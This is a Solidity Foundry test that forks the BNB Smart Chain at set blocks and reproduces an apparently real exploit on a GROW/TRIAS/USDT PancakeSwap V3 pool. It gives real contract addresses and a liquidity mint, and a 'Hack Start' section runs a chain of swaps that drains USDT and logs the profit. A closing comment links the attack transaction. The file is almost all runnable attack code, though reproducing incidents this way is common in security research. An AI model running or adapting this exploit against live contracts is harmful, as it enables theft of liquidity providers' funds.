// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "./interface.sol";

interface Pan_SmartRouter_V3 {
    function multicall(
        bytes[] calldata data
    ) external payable returns (bytes[] memory results);
}

interface Pan_Pool_V3 {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface Nonfungible_Position_Manager_V3 {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    /// @notice Creates a new position wrapped in a NFT
    /// @dev Call this when the pool does exist and is initialized. Note that if the pool is created but not initialized
    /// a method does not exist, i.e. the pool is assumed to be initialized.
    /// @param params The params necessary to mint a position, encoded as `MintParams` in calldata
    /// @return tokenId The ID of the token that represents the minted position
    /// @return liquidity The amount of liquidity for this position
    /// @return amount0 The amount of token0
    /// @return amount1 The amount of token1
    function mint(
        MintParams calldata params
    )
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        );
}

interface Pan_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /// @notice Swaps `amountIn` of one token for as much as possible of another token
    /// @param params The parameters necessary for the swap, encoded as `ExactInputSingleParams` in calldata
    /// @return amountOut The amount of the received token
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface GDSToken is IERC20 {
    function pureUsdtToToken(uint256 _uAmount) external returns (uint256);

    function lpPoolContract() external returns (address);
}

contract ContractTest is DSTest {
    address usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
    address triasAddress = 0xa4838122c683f732289805FC3C207Febd55BabDD;
    address growAddress = 0x0C9aD20802E89BeA858ae2E8594843fAfA887CB3;
    address grow_usdt_poolAddress = 0x2D2Af273117eE3639CDE46c8aF0baf447B8A1aEC;
    address trias_grow_poolAddress = 0x1DA3D00A2268B214968BF5f3AFa866fc2dEBd20f;

    address wBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address receiver = 0x5cB7ed756583AA6A9849Cb98126E25258186Ae5c;

    IERC20 USDT = IERC20(usdtAddress);
    IERC20 GROW = IERC20(growAddress);
    IERC20 TRIAS = IERC20(triasAddress);
    IERC20 WBNB = IERC20(wBNBAddress);

    Uni_Router_V2 V2Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    Pan_Router_V3 V3Router =
        Pan_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);

    Pan_Pool_V3 V3Pool =
        Pan_Pool_V3(0x1DA3D00A2268B214968BF5f3AFa866fc2dEBd20f);

    Nonfungible_Position_Manager_V3 V3Manager =
        Nonfungible_Position_Manager_V3(
            0x46A15B0b27311cedF172AB29E4f4766fbE7F4364
        );

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 36_635_338);
        // cheats.label(address(GDS), "GDS");
        // cheats.label(address(USDT), "USDT");
    }

    function testClaim() public {
        console.log("USDT Balance:", USDT.balanceOf(address(this)) / 1 ether);
        console.log("before Collect:");
        console.log(
            "GROW balance:",
            GROW.balanceOf(grow_usdt_poolAddress) / 1 ether
        );
        console.log(
            "USDT balance:",
            USDT.balanceOf(grow_usdt_poolAddress) / 1 ether
        );

        cheats.createSelectFork("bsc", 36_635_341);

        console.log("after Collect:");
        console.log(
            "GROW balance:",
            GROW.balanceOf(grow_usdt_poolAddress) / 1 ether
        );
        console.log(
            "USDT balance:",
            USDT.balanceOf(grow_usdt_poolAddress) / 1 ether
        );

        cheats.createSelectFork("bsc", 36_635_353);

        console.log("after withdraw:");
        console.log(
            "GROW balance:",
            GROW.balanceOf(grow_usdt_poolAddress) / 1 ether
        );
        console.log(
            "USDT balance:",
            USDT.balanceOf(grow_usdt_poolAddress) / 1 ether
        );

        cheats.createSelectFork("bsc", 36_635_882);

        address(WBNB).call{value: 30 ether}("");
        receiver.call{value: 10 ether}("");

        WBNBToUSDT(20 ether);
        USDT.approve(address(V3Manager), type(uint256).max);

        V3Manager.mint(
            Nonfungible_Position_Manager_V3.MintParams(
                growAddress,
                usdtAddress,
                2500,
                -887250,
                887250,
                0,
                4993384272821950249644,
                0,
                4986366882675293290834,
                address(this),
                1709440935
            )
        );

        console.log("after add:");

        console.log(
            "GROW balance:",
            GROW.balanceOf(grow_usdt_poolAddress) / 1 ether
        );
        console.log(
            "USDT balance:",
            USDT.balanceOf(grow_usdt_poolAddress) / 1 ether
        );

        uint256 beforeHackUsdt = USDT.balanceOf(address(this));

        console.log("Hack Start:");
        WBNBToTrias(1);
        TriasToGrow(TRIAS.balanceOf(address(this)));
        GrowToUsdt(GROW.balanceOf(address(this)));

        uint256 afterHackUsdt = USDT.balanceOf(address(this));
        console.log(
            "USDT Balance Add:",
            (afterHackUsdt - beforeHackUsdt) / 1 ether
        );
    }

    function WBNBToUSDT(uint256 amount) internal {
        WBNB.approve(address(V2Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        V2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function WBNBToTrias(uint256 amount) internal {
        WBNB.approve(address(V2Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(TRIAS);
        V2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function TriasToGrow(uint256 amount) internal {
        TRIAS.approve(address(V3Router), type(uint256).max);

        Pan_Router_V3.ExactInputSingleParams memory params = Pan_Router_V3
            .ExactInputSingleParams({
                tokenIn: triasAddress,
                tokenOut: growAddress,
                fee: 2500,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        V3Router.exactInputSingle(params);

        // bytes[] memory metadata = abi.encodeWithSignature("swap(address,bool,int256,uint160,bytes)", _num);
        // address[] memory path = new address[](2);
        // path[0] = address(TRIAS);
        // path[1] = address(GROW);
        // V2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     amount,
        //     0,
        //     path,
        //     address(this),
        //     block.timestamp
        // );
    }

    function GrowToUsdt(uint256 amount) internal {
        GROW.approve(address(V3Router), type(uint256).max);

        Pan_Router_V3.ExactInputSingleParams memory params = Pan_Router_V3
            .ExactInputSingleParams({
                tokenIn: growAddress,
                tokenOut: usdtAddress,
                fee: 2500,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        uint256 result = V3Router.exactInputSingle(params);
        console.log("result:", result);
    }
}

/*
encoder: https://abi.hashex.org/
decoder: https://lab.miguelmota.com/ethereum-input-data-decoder/example/

trias-grow-v3: 
NonfungiblePositionManager: 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364
PancakeV3Pool: 0x1DA3D00A2268B214968BF5f3AFa866fc2dEBd20f
Factory: 0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865
fee: 2500

add liquidity: https://bscscan.com/tx/0x642e2f865e090b920ffc12763039948bdc93a68a9f5f5a0be7a8a88054f0c3d8

attack: https://bscscan.com/tx/0x2f30dc78fc7c4f708d296f6733aee039bce58de0a3a39c49a21d9577c5779e59

blocksec: https://app.blocksec.com/explorer/tx/bsc/0x2f30dc78fc7c4f708d296f6733aee039bce58de0a3a39c49a21d9577c5779e59
*/
